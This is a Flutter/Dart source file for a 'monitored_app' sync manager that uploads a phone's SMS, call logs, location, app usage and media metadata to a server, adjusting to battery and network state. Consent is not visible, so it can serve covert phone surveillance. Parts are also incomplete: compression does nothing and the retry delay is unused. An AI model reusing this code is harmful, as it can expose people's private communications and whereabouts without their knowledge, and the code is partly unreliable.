import 'dart:async';
import 'dart:math';
import 'package:flutter/foundation.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:monitored_app/core/services/database_service.dart';
import 'package:monitored_app/core/api/api_client.dart';
import 'package:monitored_app/app/locator.dart';

enum SyncPriority {
  emergency(0),
  critical(1),
  high(2),
  normal(3),
  low(4),
  background(5);

  const SyncPriority(this.value);
  final int value;
}

enum NetworkType {
  wifi,
  cellular,
  none;
}

class SyncItem {
  final String id;
  final String type;
  final Map<String, dynamic> data;
  final SyncPriority priority;
  final DateTime createdAt;
  final int retryCount;
  final int maxRetries;
  final Duration? delay;

  SyncItem({
    required this.id,
    required this.type,
    required this.data,
    required this.priority,
    required this.createdAt,
    this.retryCount = 0,
    this.maxRetries = 3,
    this.delay,
  });

  SyncItem copyWith({
    int? retryCount,
    Duration? delay,
  }) {
    return SyncItem(
      id: id,
      type: type,
      data: data,
      priority: priority,
      createdAt: createdAt,
      retryCount: retryCount ?? this.retryCount,
      maxRetries: maxRetries,
      delay: delay ?? this.delay,
    );
  }
}

class AdaptiveSyncManager {
  static final AdaptiveSyncManager _instance = AdaptiveSyncManager._internal();
  factory AdaptiveSyncManager() => _instance;
  AdaptiveSyncManager._internal();

  final DatabaseService _databaseService = locator<DatabaseService>();
  final ApiClient _apiClient = locator<ApiClient>();
  final Battery _battery = Battery();
  final Connectivity _connectivity = Connectivity();

  // Sync configuration based on priority
  final Map<SyncPriority, int> _batchSizes = {
    SyncPriority.emergency: 1,
    SyncPriority.critical: 3,
    SyncPriority.high: 5,
    SyncPriority.normal: 10,
    SyncPriority.low: 20,
    SyncPriority.background: 50,
  };

  Timer? _syncTimer;
  bool _isSyncing = false;
  NetworkType _currentNetworkType = NetworkType.none;
  int _batteryLevel = 100;
  
  // Performance metrics
  int _successfulSyncs = 0;
  int _failedSyncs = 0;
  Duration _averageSyncTime = Duration.zero;

  Future<void> initialize() async {
    await _loadNetworkState();
    await _loadBatteryState();
    _startNetworkMonitoring();
    _startBatteryMonitoring();
    _startAdaptiveSync();
    
    debugPrint('AdaptiveSyncManager initialized');
  }

  Future<void> _loadNetworkState() async {
    final connectivityResult = await _connectivity.checkConnectivity();
    _currentNetworkType = _mapConnectivityResult(connectivityResult);
  }

  Future<void> _loadBatteryState() async {
    _batteryLevel = await _battery.batteryLevel;
  }

  void _startNetworkMonitoring() {
    _connectivity.onConnectivityChanged.listen((ConnectivityResult result) {
      final previousNetwork = _currentNetworkType;
      _currentNetworkType = _mapConnectivityResult(result);
      
      if (previousNetwork != _currentNetworkType) {
        debugPrint('Network changed: $previousNetwork -> $_currentNetworkType');
        _adaptSyncStrategy();
        
        // Immediate sync when reconnecting
        if (previousNetwork == NetworkType.none && _currentNetworkType != NetworkType.none) {
          _triggerImmediateSync();
        }
      }
    });
  }

  void _startBatteryMonitoring() {
    Timer.periodic(const Duration(minutes: 5), (timer) async {
      final previousLevel = _batteryLevel;
      _batteryLevel = await _battery.batteryLevel;
      
      if ((previousLevel - _batteryLevel).abs() > 5) {
        debugPrint('Battery level changed: $previousLevel% -> $_batteryLevel%');
        _adaptSyncStrategy();
      }
    });
  }

  void _startAdaptiveSync() {
    _syncTimer?.cancel();
    
    final interval = _calculateOptimalSyncInterval();
    _syncTimer = Timer.periodic(interval, (_) => _performSync());
    
    debugPrint('Adaptive sync started with interval: ${interval.inSeconds}s');
  }

  Duration _calculateOptimalSyncInterval() {
    // Base interval on network type and battery level
    Duration baseInterval = const Duration(minutes: 15);
    
    // Adjust for network type
    switch (_currentNetworkType) {
      case NetworkType.wifi:
        baseInterval = const Duration(minutes: 5);
        break;
      case NetworkType.cellular:
        baseInterval = const Duration(minutes: 15);
        break;
      case NetworkType.none:
        baseInterval = const Duration(hours: 1); // Will queue for later
        break;
    }
    
    // Adjust for battery level
    if (_batteryLevel < 20) {
      baseInterval = Duration(milliseconds: (baseInterval.inMilliseconds * 3).round());
    } else if (_batteryLevel < 50) {
      baseInterval = Duration(milliseconds: (baseInterval.inMilliseconds * 1.5).round());
    }
    
    return baseInterval;
  }

  void _adaptSyncStrategy() {
    if (!_isSyncing) {
      _startAdaptiveSync();
    }
  }

  Future<void> queueForSync(String type, Map<String, dynamic> data, {SyncPriority priority = SyncPriority.normal}) async {
    await _databaseService.queueDataForSync(type, data, priority: priority.value);
    
    // Immediate sync for emergency items
    if (priority == SyncPriority.emergency || priority == SyncPriority.critical) {
      _triggerImmediateSync();
    }
    
    debugPrint('Queued $type for sync with priority ${priority.name}');
  }

  Future<void> _performSync() async {
    if (_isSyncing || _currentNetworkType == NetworkType.none) {
      return;
    }

    _isSyncing = true;
    final stopwatch = Stopwatch()..start();

    try {
      await _syncByPriority();
      _successfulSyncs++;
    } catch (e) {
      _failedSyncs++;
      debugPrint('Sync failed: $e');
    } finally {
      _isSyncing = false;
      stopwatch.stop();
      _updateSyncMetrics(stopwatch.elapsed);
    }
  }

  Future<void> _syncByPriority() async {
    for (final priority in SyncPriority.values) {
      if (_currentNetworkType == NetworkType.none) break;
      
      final batchSize = _getBatchSizeForPriority(priority);
      final pendingItems = await _databaseService.getPendingSyncItems();
      
      if (pendingItems.isEmpty) continue;

      // Filter by priority and take batch
      final priorityItems = pendingItems
          .where((item) => item.priority == priority.value)
          .take(batchSize)
          .toList();

      if (priorityItems.isEmpty) continue;

      debugPrint('Syncing ${priorityItems.length} items with priority ${priority.name}');
      
      for (final item in priorityItems) {
        try {
          await _syncItem(item);
          await _databaseService.updateSyncItemStatus(item.id, 'completed');
        } catch (e) {
          await _handleSyncFailure(item, e);
        }
      }

      // Rate limiting between priority levels
      if (priority.value < SyncPriority.normal.value) {
        await Future.delayed(const Duration(milliseconds: 500));
      }
    }
  }

  int _getBatchSizeForPriority(SyncPriority priority) {
    var baseSize = _batchSizes[priority] ?? 10;
    
    // Adjust for network type
    if (_currentNetworkType == NetworkType.cellular) {
      baseSize = (baseSize * 0.7).round();
    }
    
    // Adjust for battery level
    if (_batteryLevel < 30) {
      baseSize = (baseSize * 0.5).round();
    }
    
    return max(1, baseSize);
  }

  Future<void> _syncItem(dynamic item) async {
    final endpoint = _getEndpointForType(item.type);
    final compressedData = _compressDataIfNeeded(item.payload);
    
    await _apiClient.post(endpoint, data: compressedData);
  }

  String _getEndpointForType(String type) {
    switch (type) {
      case 'sms':
        return '/sync/sms';
      case 'calls':
        return '/sync/calls';
      case 'location':
        return '/sync/location';
      case 'app_usage':
        return '/sync/app-usage';
      case 'media_metadata':
        return '/sync/media';
      default:
        return '/sync/general';
    }
  }

  Map<String, dynamic> _compressDataIfNeeded(dynamic data) {
    // Implement compression logic based on data size and network type
    if (_currentNetworkType == NetworkType.cellular) {
      // Apply compression for cellular networks
      return _compressData(data);
    }
    return data is Map<String, dynamic> ? data : {'data': data};
  }

  Map<String, dynamic> _compressData(dynamic data) {
    // Simplified compression - in production use gzip or similar
    final jsonString = data.toString();
    if (jsonString.length > 1000) {
      // Apply compression
      debugPrint('Compressing large data payload (${jsonString.length} chars)');
    }
    return data is Map<String, dynamic> ? data : {'data': data};
  }

  Future<void> _handleSyncFailure(dynamic item, dynamic error) async {
    final newRetryCount = item.retryCount + 1;
    
    if (newRetryCount >= 3) {
      await _databaseService.updateSyncItemStatus(item.id, 'failed');
      debugPrint('Item ${item.id} failed permanently after ${item.retryCount} retries');
    } else {
      // Exponential backoff
      final delay = Duration(seconds: pow(2, newRetryCount).toInt() * 30);
      await _databaseService.updateSyncItemStatus(item.id, 'pending');
      debugPrint('Item ${item.id} retry scheduled in ${delay.inSeconds}s');
    }
  }

  void _triggerImmediateSync() {
    if (!_isSyncing && _currentNetworkType != NetworkType.none) {
      Timer(const Duration(seconds: 1), () => _performSync());
    }
  }

  void _updateSyncMetrics(Duration syncTime) {
    final totalSyncs = _successfulSyncs + _failedSyncs;
    if (totalSyncs > 0) {
      _averageSyncTime = Duration(
        milliseconds: ((_averageSyncTime.inMilliseconds * (totalSyncs - 1) + syncTime.inMilliseconds) / totalSyncs).round()
      );
    }
  }

  NetworkType _mapConnectivityResult(ConnectivityResult result) {
    switch (result) {
      case ConnectivityResult.wifi:
        return NetworkType.wifi;
      case ConnectivityResult.mobile:
        return NetworkType.cellular;
      default:
        return NetworkType.none;
    }
  }

  Map<String, dynamic> getSyncMetrics() {
    return {
      'successful_syncs': _successfulSyncs,
      'failed_syncs': _failedSyncs,
      'average_sync_time_ms': _averageSyncTime.inMilliseconds,
      'current_network': _currentNetworkType.name,
      'battery_level': _batteryLevel,
      'is_syncing': _isSyncing,
    };
  }

  Future<void> dispose() async {
    _syncTimer?.cancel();
    debugPrint('AdaptiveSyncManager disposed');
  }
}